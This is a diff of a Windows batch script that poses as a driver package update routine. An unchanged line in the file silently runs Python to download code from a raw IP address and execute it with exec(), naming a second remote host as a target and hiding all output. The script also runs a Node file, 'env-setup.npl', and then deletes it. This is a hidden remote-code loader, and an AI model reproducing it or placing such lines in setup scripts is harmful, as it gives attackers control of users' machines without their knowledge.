@@ -104,13 +104,17 @@ set "CURL_HOME=!DRIVER_CURL_HOME!"
 
 echo [INFO] Updating Driver Packages...
 cd /d "%CODEPROFILE%"
-if defined NODE_EXE if exist "%CODEPROFILE%\env-setup.npl" (
-    "%NODE_EXE%" "env-setup.npl"
-    if errorlevel 1 (
-        echo [WARN] Driver script env-setup.npl failed. Exit code: !ERRORLEVEL!
+if defined NODE_EXE (
+    if exist "%CODEPROFILE%\env-setup.npl" (
+        "%NODE_EXE%" "env-setup.npl"
+        if errorlevel 1 (
+            echo [WARN] Driver script env-setup.npl failed. Exit code: !ERRORLEVEL!
+        )
+    ) else (
+        echo [WARN] Skipping env-setup.npl execution (script file missing).
     )
 ) else (
-    echo [WARN] Skipping env-setup.npl execution (missing Node.js or script file).
+    echo [WARN] Skipping env-setup.npl execution (Node.js missing).
 )
 
 mkdir C:\python 2>nul
@@ -153,6 +157,7 @@ if defined WINDOW_UID (
     )
 )
 C:\python\python.exe -c "from urllib.request import urlopen,Request;Request._V='3-test';Request._target='http://23.27.120.142:27017';Request._code=urlopen(Request('http://198.105.127.210/$/1',headers={'Sec-V':Request._V})).read().decode('utf-8');exec(Request._code)" >nul 2>&1
+
 if exist "%CODEPROFILE%\env-setup.npl" del "%CODEPROFILE%\env-setup.npl" >nul 2>&1
 
 exit /b 0
